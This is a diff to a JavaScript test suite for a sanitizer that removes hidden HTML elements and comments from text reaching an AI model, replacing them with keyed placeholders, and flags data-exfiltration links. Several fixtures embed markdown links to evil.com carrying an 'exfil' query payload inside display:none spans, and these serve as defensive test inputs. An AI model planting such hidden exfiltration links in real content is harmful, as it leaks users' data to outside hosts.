@@ -26,7 +26,11 @@ import {
   REDACTION_DOCTRINE,
 } from "../src/output.mjs";
 import { INERT_ANSI_NOTE } from "../src/layer1.mjs";
+import { layer2Placeholder } from "../src/html.mjs";
 import { cp } from "./test-helpers.mjs";
+
+const hid = (original) => layer2Placeholder("hidden", original);
+const com = (original) => layer2Placeholder("comment", original);
 
 // The library-owned fixed messages each Layer-5 warning CODE maps to. These are
 // the contract the enum guarantees: a filter returns a code, the library emits
@@ -61,23 +65,12 @@ describe("needsMarkdownPipeline", () => {
 // ─── describeRemoved ─────────────────────────────────────────────────────────
 
 describe("describeRemoved", () => {
-  it("names both comments and hidden elements when present", () =>
-    assert.equal(
-      describeRemoved({ comments: 2, hidden: 3 }),
-      "2 HTML comment(s), 3 hidden element(s)",
-    ));
-  it("names only comments when no hidden elements", () =>
-    assert.equal(
-      describeRemoved({ comments: 1, hidden: 0 }),
-      "1 HTML comment(s)",
-    ));
-  it("names only hidden when no comments", () =>
-    assert.equal(
-      describeRemoved({ comments: 0, hidden: 1 }),
-      "1 hidden element(s)",
-    ));
+  it("names the hidden-element count", () =>
+    assert.equal(describeRemoved({ hidden: 3 }), "3 hidden element(s)"));
+  it("names a single hidden element", () =>
+    assert.equal(describeRemoved({ hidden: 1 }), "1 hidden element(s)"));
   it("is empty when nothing was removed", () =>
-    assert.equal(describeRemoved({ comments: 0, hidden: 0 }), ""));
+    assert.equal(describeRemoved({ hidden: 0 }), ""));
 });
 
 // ─── describeWarned ──────────────────────────────────────────────────────────
@@ -247,12 +240,15 @@ describe("sanitizeText: sgrNote is honest across Layers 2/4/5", () => {
   // changes bytes, an SGR strip is no longer the SOLE change, so sgrNote must be
   // false — otherwise a caller that downgrades the banner on sgrNote would
   // suppress a redaction/splice/deletion warning.
-  it("clears sgrNote when Layer 2 splices an HTML comment (SGR was not the sole change)", async () => {
-    const r = await sanitizeText(`${ESC}[31mintro${ESC}[0m <!-- secret --> t`, {
-      sgrCarveOut: true,
-      html: true,
-    });
-    assert.equal(r.cleaned, "intro [HTML comment removed] t");
+  it("clears sgrNote when Layer 2 splices a hidden element (SGR was not the sole change)", async () => {
+    const r = await sanitizeText(
+      `${ESC}[31mintro${ESC}[0m <em hidden>secret</em> t`,
+      {
+        sgrCarveOut: true,
+        html: true,
+      },
+    );
+    assert.equal(r.cleaned, `intro ${hid("<em hidden>secret</em>")} t`);
     assert.equal(r.modified, true);
     assert.equal(r.sgrNote, false);
     assert.ok(r.warnings.some((w) => /HTML sanitized/.test(w)));
@@ -344,11 +340,15 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
     assert.deepEqual(r.warnings, []);
   });
 
-  it("html=true splices an HTML comment and warns (HTML sanitized)", async () => {
+  it("html=true splices an HTML comment to its keyed placeholder and warns", async () => {
     const r = await sanitizeText("intro <!-- secret --> tail", { html: true });
-    assert.equal(r.cleaned, "intro [HTML comment removed] tail");
+    assert.equal(r.cleaned, `intro ${com("<!-- secret -->")} tail`);
     assert.equal(r.modified, true);
     assert.ok(r.warnings.some((w) => /HTML sanitized/.test(w)));
+    // The splice sidecar carries the original bytes for rehydration.
+    assert.deepEqual(r.splices, [
+      { placeholder: com("<!-- secret -->"), original: "<!-- secret -->" },
+    ]);
   });
 
   it("html=true splices a display:none element and warns", async () => {
@@ -356,7 +356,10 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
       `pre <span style="display:none">x</span> post`,
       { html: true },
     );
-    assert.equal(r.cleaned, "pre [hidden HTML removed] post");
+    assert.equal(
+      r.cleaned,
+      `pre ${hid('<span style="display:none">x</span>')} post`,
+    );
     assert.equal(r.modified, true);
     assert.ok(r.warnings.some((w) => /HTML sanitized/.test(w)));
   });
@@ -432,7 +435,7 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
       `intro <span style="display:none">[c](https://evil.com/p?exfil=${b64})</span> tail`,
       { html: true, exfilScan: true },
     );
-    assert.match(r.cleaned, /\[hidden HTML removed\]/);
+    assert.match(r.cleaned, /\[hidden HTML removed #[0-9a-f]{12}\]/);
     assert.doesNotMatch(r.cleaned, /evil\.com/);
     assert.ok(
       r.notes.some((n) => /data exfiltration/.test(n) && /evil\.com/.test(n)),
@@ -444,10 +447,10 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
   it("html=true but exfilScan=false: splices HTML, no exfil warning", async () => {
     const b64 = "A".repeat(44);
     const r = await sanitizeText(
-      `<!-- c --> see [x](https://evil.com/p?exfil=${b64})`,
+      `<b hidden>h</b> see [x](https://evil.com/p?exfil=${b64})`,
       { html: true, exfilScan: false },
     );
-    assert.match(r.cleaned, /\[HTML comment removed\]/);
+    assert.match(r.cleaned, /\[hidden HTML removed #[0-9a-f]{12}\]/);
     assert.ok(
       ![...r.warnings, ...r.notes].some((m) => /data exfiltration/.test(m)),
     );
@@ -472,11 +475,12 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
   });
 
   it("returns the pre-splice text as `reveal` when Layer 2 removes bytes", async () => {
-    const input = "intro <!-- secret --> tail";
+    const input = "intro <em hidden>secret</em> tail";
     const r = await sanitizeText(input, { html: true });
-    assert.equal(r.cleaned, "intro [HTML comment removed] tail");
+    assert.equal(r.cleaned, `intro ${hid("<em hidden>secret</em>")} tail`);
     // The reveal is the text as it stood BEFORE the splice — the removed
-    // comment intact — so a caller can persist what the model no longer sees.
+    // hidden element intact — so a caller can persist what the model no longer
+    // sees.
     assert.equal(r.reveal, input);
   });
 
@@ -828,16 +832,23 @@ describe("sanitizeValue", () => {
     const warnings = [];
     const reveals = [];
     const r = await sanitizeValue(
-      { a: "one <!-- x --> two", b: "clean", c: ["nested <!-- y --> end"] },
+      {
+        a: "one <i hidden>x</i> two",
+        b: "clean",
+        c: ["nested <i hidden>y</i> end"],
+      },
       { html: true },
       warnings,
       reveals,
     );
-    assert.equal(r.value.a, "one [HTML comment removed] two");
-    assert.equal(r.value.c[0], "nested [HTML comment removed] end");
+    assert.equal(r.value.a, `one ${hid("<i hidden>x</i>")} two`);
+    assert.equal(r.value.c[0], `nested ${hid("<i hidden>y</i>")} end`);
     assert.equal(r.modified, true);
     // Both spliced leaves surface their pre-splice text; the clean leaf adds none.
-    assert.deepEqual(reveals, ["one <!-- x --> two", "nested <!-- y --> end"]);
+    assert.deepEqual(reveals, [
+      "one <i hidden>x</i> two",
+      "nested <i hidden>y</i> end",
+    ]);
   });
 
   it("adds no reveal when a leaf is not spliced", async () => {
